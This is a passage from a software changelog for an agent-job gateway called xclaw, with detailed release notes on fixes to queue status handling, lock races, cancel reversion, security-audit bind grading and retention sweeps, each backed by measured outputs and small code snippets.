`dmRemedy()`, which never tells a Slack operator to prefer pairing and says why.
A remedy string is a claim about the product. Both the audit and doctor's
`channels.scope` row read the predicate, so a channel that changes policy is
edited in one place.

Doctor shared hole 3: slack with `dmPolicy: "pairing"` and no `channelIds`
graded "slack has scoping config" = ok, while gating nobody.

Not changed, reported instead: `src/config/load.mjs:138-159` prod-hardens
telegram only, so slack in a prod profile still resolves open by default.
Forcing it there would change what an existing deployment resolves to — an
operator decision, not a bug fix. The audit warning is the observable fix.
`src/channels/manage.mjs:26` likewise offers "pairing" in the UI for channels
that discard it.

## 3.327.0

### `abandoned` was a queue status the rest of the system did not know exists

`processNext` abandons a queued item once it has waited past the admission
controller's patience budget and writes `status: "abandoned"`. Two other
surfaces enumerated the statuses by hand and neither list included it.

**`/metrics` could not see it.** `renderMetrics` looped a five-element literal
`["queued","running","succeeded","failed","cancelled"]`, so
`xclaw_queue_jobs{status="abandoned"}` was never emitted — not even as 0.
`/queue/stats` counted abandoned items the whole time, so the two surfaces
disagreed, and the one status that means *the queue is over capacity* was the
one a scraper could not alert on. The list is now derived from
`QUEUE_STATUSES`, exported by the module that defines the statuses.

**An abandoned record was immortal.** `clearCompletedQueue` removed
`succeeded|failed|cancelled` only, so no API could ever delete an abandoned
item. `listQueue` reads and JSON-parses every file in the queue directory on
every call, and it is called by every enqueue, every `processNext` and every
scrape — so each undeletable record was a permanent tax on all three. Clearing
now uses a new `TERMINAL_QUEUE_STATUSES` export; `queued` and `running` are
deliberately absent from it, so clearing still never deletes live work.

### The admission controller's documented defaults were NaN

```js
let maxDepth = Math.max(0, Number(cfg.maxDepth) ?? 100);
```

`Number(undefined)` is `NaN`, not `undefined`, so `??` never fires and the
fallback never applied. Both `maxDepth` and `maxWaitMs` initialised to `NaN`,
which makes every comparison false: `queued >= maxDepth` never admits-false,
`waited > maxWaitMs` never abandons. Proved against the live config
(`"queue": {"concurrency": 1}`) on the running 3.326.0 build:

```
internal maxDepth  = NaN      tryAdmit at 10000 queued -> admit:true
internal maxWaitMs = NaN      shouldAbandon a 24h-old item -> false
```

**Queue enforcement was not disabled.** Both live call sites — `enqueueJob`
and `processNext` — call `adm.configure(...)` with values from `queue.mjs`'s
own `maxDepth(cfg)` / `maxWaitMsCfg(cfg)` helpers, which implement exactly the
right guard, immediately before use. The bound came back before it was
enforced. That guarded duplicate sitting beside the broken original is why
this survived: `queueStats` passes the same helper values into
`adm.snapshot({...})`, which spreads them last, so `/queue/stats` displayed a
correct `maxDepth: 100` over a controller holding `NaN`.

**The reachable live consequence was a reporting failure.** `GET
/queue/admission` answers `q.maxDepth ?? adm.maxDepth`, reading the controller
directly with no configure in between. On the running 3.326.0 gateway:

```
"policy": { "concurrency": 1, "maxDepth": null, "maxWaitMs": null, ... }
```

`NaN` serialises to JSON `null` — the endpoint told the operator the queue had
no finite buffer and no patience budget at all. Both bounds now go through a
single `boundedNumber(v, fallback)` used on construction and in `configure`,
so an unusable value (a missing key, or `"maxWaitMs": "5m"` typed into
`xclaw.json`) falls back to the documented default instead of to `NaN`.

## 3.326.0 (2026-08-28)

### Fixed — a fabric lock could be stolen while its owner was still writing it

`acquireFabricLock` created its lockfile with `fs.open(lp, "wx")` and wrote the
owner payload *afterwards*. Between those two awaits the lock exists and is
EMPTY. A concurrent acquirer that read it in that window fell through to the
legacy bare-pid fallback, where `Number("")` is `0`, decided pid 0 was dead,
**unlinked a live lock and took it**. Mutual exclusion was off for the whole
overlap.

Two further legs made it worse:

- `release()` did `fs.unlink(lp)` unconditionally — it deleted whatever was at
  the path, including a lock another holder had since taken.
- the stale check unlinked the lock on *any* read error: "I could not read this
  lock, therefore I may take it."

Observed, not theorised — `browser-a8-fabric`'s serialisation subtest failed
with both critical sections interleaved, which no timing tolerance explains:

```
["b-start","a-start","b-end","a-end"]
```

and a direct repro against the shipping source:

```
lock file exists empty: 0
STOLE a live-but-unwritten lock: {"pid":979252,"at":...,"host":"srv1474168"}
```

This is the only thing serialising cross-process read-modify-write on
`tab-leases.json`, `commit-gates.json`, `session-roles.json`, `clock.json`,
role binding and the automations store.

Fix: publish the lockfile atomically — write the payload to a unique temp file,
then `fs.link(tmp, lp)`. `link` fails `EEXIST` when the lock is held, and what
it publishes already carries the owner payload, so a lock is never observable
mid-creation. Reclaim now requires *evidence* (a pid read and proven gone, or
an age past the stale window); an unreadable lock is evidence of nothing and is
waited on. Release unlinks only while the file still holds the payload it took.

## 3.325.0 (2026-08-28)

### Fixed — a cancel, confirmed to the operator, silently reverted and the job re-ran

`POST /queue/<id>/cancel` writes the record. `processNext` holds that same
record in memory for the entire job — minutes — and ends with an unconditional
`saveItem`. Anything an operator decides inside that window is overwritten by a
run that has not looked at the disk since it started.

Measured live against the running 3.324.0 gateway before a line was written
(`q_mtd91tqe_231ef5a2`, `maxAttempts: 2`, cancel fired the instant the item
went `running`):

```
t=   0.0  queued
t=   0.3  running
t=   0.3  POST /queue/.../cancel -> 200 {"status":"cancelled",
            "error":"cancelled while running (best-effort; worker may still finish)"}
t=   0.5  on disk: cancelled          <- the operator was told it stuck
t=  56.0  running    attempt 2        <- reverted, and RE-RUN
t= 143.4  failed     "structured claims empty"
```

The run's final save put the item back to `queued` (the retry branch), so the
`finally` block's `kick` picked the cancelled job up again and spent another
62.7s of model time on it. It ended `failed` with the operator's cancellation
message replaced — no trace anywhere in the record that a cancel had ever
happened. "Best-effort, the worker may still finish" is an honest promise; this
was the opposite, a cancel undone by the thing it cancelled.

Same root, second shape: `clearCompletedQueue` unlinks `cancelled` items, so
cancel-then-clear during a run let the final save **resurrect** a record the
operator had deleted.

The fix is a re-read at the moment of writing, through one pure decision:

```js
export function settleAfterRun(next, onDisk) {
  if (!onDisk) return null;                            // cleared mid-run
  if (onDisk.status !== "cancelled") return next;
  return { ...next, status: "cancelled", error: onDisk.error, ... };
}
```

A terminal decision belongs to whoever made it. The cancelled record keeps the
in-flight attempt's `result`, so the operator can still see what the run did
before it was stopped; because the item is no longer `queued`, nothing re-kicks
it. `processNext` cannot be driven from a test (`runJob` is a static import),
so the call site is pinned by parsing the call graph; all eight shipping lines
were mutation-verified in both directions.

## 3.324.0 (2026-08-28)

### Fixed — `xclaw queue batch`: the third writer that bypassed the owner

`src/jobs/batch.mjs` hand-rolled its own enqueue, so both 3.323.0 defects
survived in it. Measured live against the running 3.323.0 gateway with an idle,
unpaused queue, before a line was written — one JSONL item, `harness: true,
class: "interactive", priority: 5, verify: [...]`:

```
$ xclaw queue batch jobs.jsonl
record as the OWNER stored it (q_mtd83n10_9393a703):
  { "harness": false, "class": "batch", "priority": 5,
    "verify": 1, "maxAttempts": 1 }
t=4s status=queued  ...  t=24s status=queued
```

Two failures in one line:

1. **The capability was dropped in transit.** The item's `harness: true` never
   arrived: it kept its `verify` steps and lost every flag that makes them
   enforced — a verified job silently downgraded to an unverified one that
   still reports success. `class` was overwritten too, and
   `priority: it.priority ?? 0` forced 0 for any item that named a class
   instead of a number. The accepted shape now comes from the exported
   `pickEnqueueRequest()`, the same one `POST /queue` uses.
2. **The owner was never told.** `enqueueJob()`'s `kick()` fires in the
   *calling* process, so the batch armed a worker inside a CLI that exits
   0.1s later. The gateway arms its worker at boot and re-arms it only while
   items remain, so a job appearing on disk while it is idle is never picked
   up — hence `queued` 24s on. Batch items now go through `runQueueControl()`,
   which posts to the owner and falls back to disk *with a printed note* when
   no gateway answers.

### Removed

- `enqueueFromFile`'s never-injected `enqueueLocal` dependency, an unreachable
  `!Array.isArray` throw (valid JSON starting with `[` is always an array), and
  a `!out.ok` branch that cannot be reached — an `add` given a local fallback
  either succeeds or throws. That contract is now pinned on the callee instead,
  and a thrown item is reported as *that item's* error rather than aborting the
  whole batch.

## 3.323.0 (2026-08-28)

### Fixed — the CLI acted as the queue's owner; the running gateway is

`xclaw queue pause` called `pauseQueue()`, which flips a **module-level
`worker` singleton**, printed that singleton, and exited 0. It ran inside the
CLI's own 0.1s process. Nothing ever reached the gateway. Measured live against
the running 3.322.0 gateway before any code was written:

```
gateway /metrics    xclaw_queue_paused 0
$ xclaw queue pause  ->  {"paused": true, "blocked": true}   exit 0
gateway /metrics    xclaw_queue_paused 0        <-- the stop did nothing
```

An operator stopping the queue was told it had stopped. It had not. This is the
mutating twin of the 3.309.0 class (an out-of-process CLI grading a value it
cannot observe) — here it *reports* a mutation it cannot perform.

Two more of the same root, both measured against the real modules:

* **A job added by any second process was never picked up.** The gateway arms
  its worker at boot and re-arms it only `if (left)` after finishing one, so a
  job appearing on disk while it is idle sits there. Measured: gateway idle, a
  child process enqueues and exits, one second later still `queued`.
* **`case "queue"` armed a queue worker for every subcommand**, read-only ones
  included. Measured, that line does nothing at all — the dispatch timer is
  `unref()`'d and every subcommand is one disk read from `break`, so the process
  is gone first (3/3 `queue list` runs left the job `queued`, exit in 0.10s). It
  is dead code that reads like a dispatcher, and on the day it won the race it
  would start an agent run in a process about to exit, against the queue
  directory the gateway owns. Deleted.

The CLI is now a client of the owner. `pause`/`resume` go over HTTP and there
is **no local fallback** — an undelivered stop exits non-zero and says why,
because a stop that reads as delivered and is not is worse than a failure.
`add` goes to `POST /queue`, which enqueues *and* kicks the owner's worker; with
no gateway running it still queues to disk and says on stderr that nothing will
start it yet.

### Fixed — a harness job lost its grounding flags in transit

Routing `xclaw goal` through the owner exposed the next defect: `POST /queue`
forwarded `goal|verify|maxTurns|priority` and dropped everything else, while
`enqueueJob` honours seven more fields. Measured live against the 3.322.0
gateway — `xclaw goal "..." --harness --cmd "true"`, as the owner stored it:

```
harness: false          <-- asked for true
groundHard              <-- absent
claimsRequireEvidence   <-- absent
requireStructuredClaims <-- absent
```

The job kept its `verify` steps and lost every flag that makes them enforced: a
verified job silently downgraded to an unverified one that still reports
success. The accepted request shape is now one exported function,
`pickEnqueueRequest()`, used by the route — retry and admission-wait ceilings
stay config-owned and are deliberately not accepted from a request.

### Changed

* One `gatewayBaseUrl()` builder in `src/cli/gateway-client.mjs`; `tui.mjs`'s
  private copy folded into it. (Seven inline copies remain elsewhere.)
* The decision moved out of the 2000-line `switch` into `runQueueControl()`, so
  it can be tested at all.

Live proof after the fix: `xclaw queue pause` moved `xclaw_queue_paused` 0 -> 1
and `resume` returned it to 0; a job added by the CLI process went
`t=1s queued -> t=2s running -> t=8s succeeded`.

18 tests (18 new), 21 mutations across every shipping line, all RED.

## 3.322.0 (2026-08-28)

### Fixed — the budget halt that latched the queue worker forever

When the cost governor hit its daily hard cap, `kick()` wrote that verdict into
`worker.paused` — the same flag `pauseQueue()`/`resumeQueue()` own. Nothing on
either documented recovery path clears it: the control UI's Resume and the
midnight rollover both reset the governor **ledger**, and no code anywhere
cleared `worker.paused`. So the queue worker returned at its early guard for
the remaining life of the gateway process, and the halt alert's promise that
jobs resume "tomorrow" was false. Measured against the real modules before the
fix:

```
over cap     governor{hard:true  paused:true }  queueStatus.paused=true
after resume governor{hard:false paused:false}  queueStatus.paused=true
next day     governor{hard:false paused:false}  queueStatus.paused=true
```

One flag was carrying two facts. An operator pause must latch until a human
lifts it; a budget halt must lift the moment the budget does. They are separate
fields now — `paused` (the operator's, sticky) and `governorHalt` (derived from
the governor on every kick, in both directions) — with `blocked` answering the
only question callers actually have: will this queue run a job?

- The gate now sits in `processNext`, where work starts, and nowhere else.
  It was also in `kick`, where work is merely *scheduled*: a pause landing
  inside kick's 50ms timer window was outrun by the timer armed a moment
  earlier, and the job ran anyway. Two copies of one predicate in one file is
  the divergent-duplicate shape besides.
- `queueSettled()` exposes the in-flight governor read. `kick()` must not block
  its callers, so the check runs detached — which left the decision
  unobservable: `queueStatus()` read a verdict still in flight, and readings
  came back literally one kick behind. A gate nothing can await is a gate
  nothing can test.
- Metrics: `xclaw_queue_paused` now reports `blocked`, so an alert on "the
  queue stopped" does not go quiet because the halt stopped latching, and a new
  `xclaw_queue_governor_halt` gauge says *which* of the two reasons it is.
- The halt DM told the owner to run `/cost resume`. There is no `/cost` channel
  command and no `cost resume` subcommand — grep both surfaces. It now names
  the daily reset and the control UI, which exist.

10 tests in `test/queue-governor-release.test.mjs` (including two that watch a
real queue item refuse to start and then start), 1 in
`test/cost-band-transitions.test.mjs`; 14 mutations across every shipping line,
all RED.

## 3.321.0 (2026-08-28)

### Fixed — the security audit had no opinion about the binds that matter

`runSecurityAudit` graded the gateway's bind address against a list of five
string literals: three wildcard spellings warned, two loopback spellings were
ok, and **anything else produced no finding at all**. A gateway bound to a LAN
address, a public address or a hostname — the exposures the row exists to
report — was reported on by nobody, and `ok` stayed `true`. Proven against the
real module before the fix:

```
LAN bind 10.0.0.5          ok=true | bind: ** NO FINDING **
public bind 203.0.113.9    ok=true | bind: ** NO FINDING **
ipv6 loopback ::1          ok=true | bind: ** NO FINDING **
wildcard 0.0.0.0           ok=true | bind: warn Gateway binds 0.0.0.0 (all interfaces)
```

`::1` fell into the same silent branch, so the audit could not tell the safe
case from the dangerous one either. The one bind the suite pinned — `0.0.0.0`
— was the one input incapable of exhibiting the bug.

Second fail-open in the next three lines: `gateway.token` picked `info` vs
`error` from those same two loopback literals and never consulted the profile,
while the doctor's own `owner.gatewayToken` row grades the identical fact
(`prod && !token`) an `error`. `xclaw security-audit` therefore told a prod
operator with no gateway token that everything was fine.

- Both rows now use `isLoopbackHost` from `src/gateway/bind-guard.mjs` — the
  predicate the gateway enforces its own bind safety with — so "local" means
  one thing in this codebase instead of three, and every non-loopback host
  gets a `warn` naming it plus the remedy.
- A tokenless gateway is now `error` when the profile is prod (`cfg.profile`
  or `XCLAW_PROFILE`) *or* the bind is non-loopback; `info` stays for the lab
  localhost case it was meant for.
- 13 new tests (18 in the file), 10 mutations across every shipping line, all
  RED.

## 3.320.0 (2026-08-28)

### Fixed — one config setting, two contradictory doctor rows, hidden by a typo in the id

`xclaw doctor` translates every `runSecurityAudit` finding into a report row.
That translation was three inline lines in `runDoctor`, and each one was wrong.

**The prefix was applied unconditionally.** Three of the audit's ids already
carry it — `security.autoApprove`, `security.systemRunPlan`,
`security.requirePinnedExe` — so the live report printed
`security.security.autoApprove`. The doubling was not cosmetic. The doctor also
pushed its *own* `security.autoApprove` row a few lines above, and because the
audit's copy came out under a different id, both shipped, on every host, saying
different things about the same setting:

```
warn | config.warn                   | security.autoApprove=true with requireApproval list — approvals may be auto-granted
warn | security.autoApprove          | autoApprove=true — tools may run without human gate
warn | security.security.autoApprove | autoApprove=true — Use only in lab; prod should use approvalPolicy risky/safeAuto
```

`test/doctor-no-duplicate-probes.test.mjs` exists and could not see this: it
pins the probe *functions* runDoctor reaches, not the row ids they emit. A
duplicate that renames itself is invisible to a duplicate check. The inline
push is deleted — the audit's finding of the same name says the same thing and
carries the remedy the inline one lacked — which is also what makes
de-doubling safe, since the two otherwise collapse onto one id and contradict
each other.

**The level map had a dead branch.**
`if (level === "ok") push(…, "ok"); else push(…, "ok");` — byte-identical arms,
which is how audit `info` was reported as `ok`. The doctor has rendered `info`
since 3.313.0 (`cron.ledger`, `ops.smoke_compare`, `ops.quota_escalate`), and
that level exists for "nothing to report either way". A localhost host with no
gateway token got a green row reading *No XCLAW_GATEWAY_TOKEN / gateway.token*.
Levels now map through unchanged; a level the doctor cannot render stays an
error rather than being rendered green.

**The remedy was dropped from advisory rows.** `fix` was appended for
warn/error only — so the one `info` finding that carries a fix lost it. The
rule is now uniform across levels: one branch fewer, and no level can silently
lose information again.

Translation is a pure module (`src/cli/doctor-audit-row.mjs`) with unit tests;
its wiring back into `runDoctor` — which loads real config and makes live HTTP,
so it cannot be fixtured — is pinned by a test that reads the call site as
text, including that the inline duplicate has not returned. All shipping lines
are mutation-verified.

## 3.319.0 (2026-08-28)

### Fixed — the tmp sweeper's failures were unreadable by construction

`sweepStaleTmp` returns `{removed, kept, skippedReferenced, errors}`. Two of its
three callers dropped the fourth field:

- `reportOpsRun` printed one line, `tmp sweep: removed N stale entries`, and
  only when N was non-zero. A sweep whose every `fs.rm` failed — a busy mount, a
  permission change — removes nothing, so it printed nothing, which is exactly
  what a clean host prints. Live evidence: six `[xclaw:ops]` lines in thirteen
  days of gateway log, every one a removal count, not one error or census among
  them. The line is now unconditional and carries the whole census (removed /
  kept fresh / skipped referenced), and each error is warned. Absence of the
  line now means the sweep was never armed, never that it failed quietly.
- the doctor's `ops.tmp` row summed `removed + kept + skippedReferenced` and
  never read `errors`. A sweep that cannot `readdir` the tmpdir returns those
  three empty and the reason in the fourth, so the row printed `0 xclaw tmp
  entries, 0 past a full sweep cycle` at status **ok** — an unreadable tmpdir
  graded as a pristine host. `tmpSweepProbe` now grades errors first, because a
  failed sweep invalidates every count under it.

This is the inverse of the defect the quota rows were fixed for at 3.313.0:
there a missing artifact was reported as a fault, here an actual fault was
reported as health. Same root — a count taken over a denominator that was never
measured.

Testing note: the probe body lives inside `runDoctor`, which loads the real
config and cannot be pointed at a fixture, so the decision is pure and unit
tested while the wiring is pinned by reading the call site. All four shipping
lines are mutation-verified: each one, reverted, kills exactly the named test
and nothing else.

## 3.318.0 (2026-08-28)

### Fixed — the durable memory store was a directory of directories, bounded by nothing

`appendMemory` rotates each workspace's `events.jsonl` at 1MB, so every *file*
in `~/.xclaw/memory` is bounded. The store itself was not. `memoryPaths()` mints
one permanent directory per distinct workspace path, keyed by a one-way sha256,
and nothing ever removed one. `src/ops/maintenance.mjs` — the module whose
stated job is bounding growth — named the memory store in neither its rotation
targets nor its "Not handled here" exemptions. That is the third time a
directory of discrete artifacts has grown forever because it appeared in
neither list, after the proof bundles (3.316.0) and the checkpoints (3.317.0).

Measured live at 3.317.0: **208 workspace directories, 416 files, 2.5MB, oldest
13.0 days** — roughly 16 new directories per day, forever. 206 of the 208 were
throwaway `/tmp` eval and job workspaces; only `/root/xclaw` and
`/root/xclaw/tmp-live` were real.

**Age alone would have been the wrong rule.** A long-lived workspace's memory is
the one thing in this store worth keeping, and it is also the most likely to be
old — a plain age sweep deletes exactly the wrong directories first. The store
already recorded what makes the distinction safe: `rebuildMemoryMd` has always
written the workspace into `MEMORY.md` as ``Path: `...` ``. Nothing had ever read
it back. Reading it turns "old" into "provably unreachable", so retention now
prunes only a directory whose recorded workspace is **gone**:

- a directory whose workspace still resolves is kept regardless of age;
- a directory whose path cannot be read is counted `unattributable` and left
  alone — "I cannot tell" is not a licence to delete;
- both bounds (`memory.orphanMaxAgeMs`, default 30d; `memory.orphanKeepMax`,
  default 500, applied to orphans only, newest first) sit above the live
  population, so enabling retention deletes nothing already on disk.

Of the 208, 169 were provable orphans and 39 still resolved — but only because
the daily `/tmp` sweeper had not reached them yet. Directory existence is a race
against that sweeper, not a measure of worth, which is why the count ceiling is
scoped to orphans and the age grace is generous.

`runOpsMaintenance` now reports a `memory` census every pass whether or not it
prunes, and the exemption list no longer stays silent about what it skips:
screenshots are named there as a deliberate deferral. Absence from both lists is
no longer allowed to mean anything.

### Fixed — three retention censuses were computed daily and printed nowhere

`runOpsMaintenance` has exactly one production caller: the daily ops timer in
`src/ops/scheduler.mjs`. The only thing that turns its result into words is
`reportOpsRun`, which logged the ledger compaction and the rotations and
dropped the rest. So the proof-bundle census (3.316.0), the checkpoint census
(3.317.0) and the memory census above were each computed once a day and read by
nobody — nothing else in the codebase consumes that object. The memory sweep's
whole safety argument is that a directory it cannot attribute is counted
`unattributable` and left alone; unheard, that is not a promise.

`reportOpsRun` now prints the directory retention census, the checkpoint census
and the memory census — and stays silent only about stores that do not exist,
so a line always means a measurement was actually taken.

A fourth instance of the same shape was found in the maintenance module's own
doc comment, which since 3.316.0 has read: *"Rotation's under-cap result used to
be computed and then dropped by `if (r.rotated)` ... so measurements are
reported alongside the actions."* The code still read `if (r.rotated)
out.rotated.push(r)`. The fix the comment described had never been applied, and
a file at 99% of its ceiling was still indistinguishable from one that did not
exist. Measurements now land in a new `sizes` array — every target, every pass —
and `rotated` keeps its meaning of what was actually moved. A comment is not a
test; this one graded itself passing for two releases.

### Testing note — a fixture that pinned the one input that could not exhibit the bug

The guard protecting unattributable directories was mutation-tested and the
mutation stayed **green**. The fixture aged the directory to 400 days and *then*
removed its `MEMORY.md` — but unlinking a file resets the parent directory's
mtime, so the directory under test was in fact fresh, and the age bound rather
than the guard was what spared it. The assertion was true for the wrong reason.
Aging the directory after the removal makes the mutation fail as it should.

## 3.317.0 (2026-08-28)

### Fixed — a retention policy that had a doctor row, tests, and no way to run

`pruneCheckpoints` has enforced a documented policy (`maxCount` 100, `maxAgeMs`
14 days, `running`/`resuming` never evicted) since the checkpoint store was
added. It has unit tests. The doctor has a `checkpoints.store` row and a
`--prune-checkpoints` flag. What it did not have was a production caller that
runs on a normal host: the only one was `runEvolutionTick`, reached solely from
`src/cron/heartbeat.mjs`. A host with no heartbeat cron job never runs an
evolution tick, so it never evicts a checkpoint.

Measured live at 3.316.0: `cron.jobs = 0`, and `~/.xclaw/checkpoints` held
**205 files, of which 204 were evictable** (122 succeeded, 69 failed, 13
budget_exceeded, 1 running) against a `maxCount` of 100. A ceiling twice
exceeded is proof it was never once applied — a quantitative bound verifies its
own enforcement, which is why this was findable at all.

The omission has the exact shape of the proof-bundle finding in 3.316.0:
`src/ops/maintenance.mjs`, the module that owns boundedness, named checkpoints
in **neither** its targets nor its "Not handled here" exemptions. In review an
omission is indistinguishable from a deliberate exemption.

Eviction now runs from the daily ops pass. It is called with no `maxCount` /
`maxAgeMs` override, so the single existing `cfg.checkpoints.*` policy governs
and no second, divergent default is created. The heartbeat call is left in
place, now a harmless idempotent extra.

Second reason the daily pass is the right home: the heartbeat path sits *after*
`inQuietHours(cfg)` and `canSpend(cfg, 0)` early returns, so free disk
housekeeping was gated behind the LLM budget and the time of day. Eviction is
now independent of both.

### Fixed — a doctor row that printed its own cap as a measurement

`checkpoints.store` reported `listed=${list.length}` from
`listCheckpoints(cfg, { limit: 50 })`, whose last statement is `.slice(0, limit)`.
So 205 checkpoints printed `listed=50` — and so would 5000. `running` and
`resumed` were likewise counted over only the newest 50, hiding an old stuck job
completely. Counting is a different question from sampling, so it gets its own
primitive: `countCheckpoints()` returns the true `total` and a `byStatus`
breakdown, and the row now prints `total=`.

This is the same class as the 3.315.0 evidence clip at 50: a number that looks
like a measurement but is the ceiling of the instrument.

### Operator note — no retroactive deletion

The live host has no `checkpoints` section in `~/.xclaw/xclaw.json`, so the
shipped defaults would apply in full on the first daily pass. Consistent with
the 3.316.0 rule that *enabling retention must not destroy evidence already on
disk*, both bounds are raised on that host before the fix goes live:
`checkpoints.maxCount` to 300 (above the live population of 205) and
`checkpoints.maxAgeMs` to 60 days.

The age bound is the one that mattered, and it is only visible if you measure
the distribution rather than the count. At 3.316.0 the store's oldest entry was
**12.99 days** — nothing was over the 14-day default, so the count rule looked
like the only binding one. But 167 of the 205 receipts were already over 7 days,
so within roughly a day of shipping, a policy that had never run once would have
deleted them in a single pass. "Nothing is over the limit today" is not the same
statement as "nothing is about to be", and only the second one is a safety
argument.

Growth is bounded where it was unbounded; the operator can lower either ceiling
to the default whenever they choose, and the corrected doctor row now shows the
real total to decide from.

## 3.316.0 (2026-08-28)

### Fixed — a directory of audit artifacts that nothing bounded, read, or watched

`exportProofBundle` writes `proof_<ts>.json` into `<mitm confdir>/proofs` on
every call. Nothing in the codebase ever reads a bundle back, no doctor probe
looks at the directory, and `ops.maintenance` — the module whose stated job is
"unbounded append-only files" — listed the directory neither in its rotation
targets nor in its "Not handled here" exemptions. It was omitted, not exempted.

Measured live: **1214 bundles, 9.7 MB**, oldest 2026-08-13, newest the same hour
it was measured. (Most are residue from the smoke-test confdir leak fixed in
3.310.0; the growth path itself was never bounded.)

Rotation could not cover this. `rotateJsonlIfOversize` splits one file at a line
boundary; a directory that gains a whole file per operation is the same
unboundedness in a different shape. New `pruneDirByAge(dir, opts)` primitive:
age ceiling, then a newest-first count ceiling, deleting only regular files
matching a caller-supplied name pattern so a mis-pointed directory cannot eat
anything it did not create. Wired into the daily pass for the proofs directory
at 30 days / 2000 files (`ops.maintenance.proofMaxAgeDays`, `.proofKeepMax`).

Both ceilings sit above the current live population deliberately: enabling
retention must not retroactively delete evidence already on disk. Nothing is
pruned on this host today; growth from here is bounded.

### Fixed — measurements computed and then thrown away

`runOpsMaintenance` did `if (r.rotated) out.rotated.push(r)`, so a file at 99% of
its cap and a file that does not exist produced identical (empty) output. A
ceiling you only hear about once it has been crossed is not observability. The
new directory pass returns its census — files, bytes, pruned, prunedBytes —
whether or not it changed anything, and `out.dirs` carries it every run.

## 3.315.0 (2026-08-28)

### Fixed — a sha256-attested audit bundle that silently dropped evidence

`exportProofBundle` writes the truth proof bundle: flows, policy rules, action
bindings, and a `contentSha256` over the whole thing. The hash makes it
tamper-evident. It did not make it complete, and nothing in the bundle said so.

`bindings: bindings.slice(0, 50)` clipped the binding list at 50 with no count
and no marker — while `flowCount` and `ruleCount` sat in the same object. The
bundle's own format establishes the convention that every evidence array is
reported alongside its size; bindings were the one array left out of it, so a
reader had no way to tell 50-of-50 from 50-of-2351.

Measured on this host: `action-bindings.jsonl` holds **2351** rows, and of the
1214 bundles in `~/.xclaw/mitm/proofs`, **1212 carry exactly 50** bindings. (The
file count is residue from the confdir leak fixed in 3.310.0 — but those
runs read the operator's real bindings file, so the 50s are real reads of a
2351-row population.) The cap was being hit on essentially every export, and a
hash was stamped over the sample as though it were the record. A sha256 over
silently-clipped evidence is worse than no hash: it reads as authoritative.

Now every evidence array carries a count, and `truncated` says whether the
bundle holds the population or a sample of it:

- `bindingCount` joins `flowCount` and `ruleCount`.
- `truncated: { flows, bindings }` is set whenever rows were dropped — by the
  `limit` slice, or by `readMitmFlows`' internal 500-row read ceiling.
- `mitm_export` prints `bindings: 50 (truncated)`, because a marker only the
  JSON carries is a marker nobody reads.

Both bundle fields are additive; older readers ignore them. Bindings truncation
is detected by asking for one row more than is kept (`limit: 51`, down from
`100`) — since `readActionBindings` returns newest-first, the retained 50 are
byte-identical to what the old read produced, verified against the live 2351-row
file. Flows truncation was already paid for: the function over-fetches `limit * 2`
and then discarded the one fact that over-fetch buys.

## 3.314.0 (2026-08-28)

### Fixed — three doctor rows that reported "no data" as a fault

`ops.quota_hard_circuit`, `ops.quota_escalate` and `ops.smoke_compare` warned
on every doctor run on this host, and had done so for as long as the rows have
existed. None of them had measured anything.

- `ops.quota_hard_circuit` reads `reports/jobs/index.jsonl`. The file does not
  exist on a host that has never run a `/job`, so the probe warned and printed
  `hard-circuit trips=0/0 hardBlocks=0` — a line that reads as a clean
  measurement, attached to a status that says something is wrong.
- `ops.quota_escalate` substituted `{ jobs: 0, hardBlocks: 0, hardBlockRate: 0 }`
  whenever the autonomy smoke artifact was absent, then printed
  `hardBlockRate=0.000` through `.toFixed(3)`. A rate over an empty denominator
  is undefined, not 0.000; the zero was fabricated, formatted, and shipped to
  the operator as a reading.
- `ops.smoke_compare` reported `missing_current` as a warn.

The shared cause is that nothing in production writes
`reports/autonomy/last-smoke.json`. Its only writer is
`scripts/autonomy-smoke-offline.mjs`, invoked from `scripts/ci-ship-pack.mjs`,
which no GitHub workflow runs — so the artifact exists only inside a build
checkout that is then thrown away. Two of the three rows were grading a
CI-gate artifact as if it were operational health, and the third was grading
an artifact that no host produces.

No sample is not a fault; it is the absence of evidence either way. The doctor
already has a level for that (`cron.ledger` says "not created yet (no persisted
jobs)" at `info`, and `runDoctor` already treats `info` and `ok` alike). All
three rows now report absence at `info`, naming the artifact that is missing —
and, for the smoke, the command that produces it. `warn` and `error` are left
to mean a rate actually measured over jobs that actually ran.

A probe that reads the same in the healthy and the broken state is not a probe.
Recorded as the same class as 3.313.0, at three times the surface.

### Tests

`test/doctor-quota-hard-circuit.test.mjs` previously contained
`it("warns with empty job index")` — a test asserting the false positive was
correct. It is now a regression test for the opposite. No test had ever
asserted the *message text* of either quota probe, which is how a fabricated
`hardBlockRate=0.000` survived: the new tests assert that the no-data branches
print no rate at all. 14 tests across the three files, each mutation-verified
in both directions against the 3.313.0 sources.

## 3.313.0 (2026-08-28)

### Fixed — a doctor warn that read the same whether the sweeper worked or not

`doctor ops.tmp` counted `/tmp/xclaw-*` entries older than the sweeper's own
24h retention bound and warned above fifty of them. The sweeper runs once a
day, so a full interval of entries ages past that bound between any two runs,
by construction: the probe was grading against a bound its writer never claimed
to hold.

Measured live on this host: 24,976 entries, 5,723 of them in the 24-48h window
— and exactly one older than 48h, a mission-referenced worktree the sweeper
deliberately skips. The sweep had run 11.8h earlier and was working perfectly,
and the probe called it a fault. On any host that runs the suite it had been
warning permanently.

The cost is not the false positive. It is that during the six-day sweep outage
recorded in `src/ops/due.mjs` — 83,671 stale entries — this probe said the same
thing it says on a healthy host. A signal that reads identically in the healthy
and the broken state carries no information, which is why that outage was found
by accident, weeks late, and not by the check that was watching it.

Grading now starts one full sweep cycle past the retention bound, so a count is
evidence of litter the sweep cannot explain; a sweep that is not running at all
stays `ops.schedule`'s finding, and the manual `xclaw sweep-tmp` remedy is
offered only when config has actually switched the sweep off — previously it
told the operator to do by hand what the daily job was already doing.

- The decision moved to a pure `src/cli/doctor-tmp.mjs`, alongside
  `doctor-schedule.mjs` and for the same reason: probes written inline in
  `runDoctor` cannot be pointed at a fixture, so they ship untested.
- `SWEEP_MAX_AGE_MS` is now exported from the sweeper. The doctor had the
  string `(>24h)` hard-coded against a constant it could not see.
- `countStaleTmp()` is deleted: a bare count was its whole purpose and the
  probe was its only caller.

Verified: the new tests fail (2/6) when the grading age is reverted to the bare
bound, and fail (1/6) when the grace is granted unconditionally to a disabled
sweep. Live: `ops.tmp: 25002 xclaw tmp entries, 0 past a full sweep cycle (48h)`.

## 3.312.0 (2026-08-28)

- The CI run for v3.311.0 came back red on one matrix leg only — `gate (24.15)`
  failed while `gate (22.22)` passed — with one failing assertion in
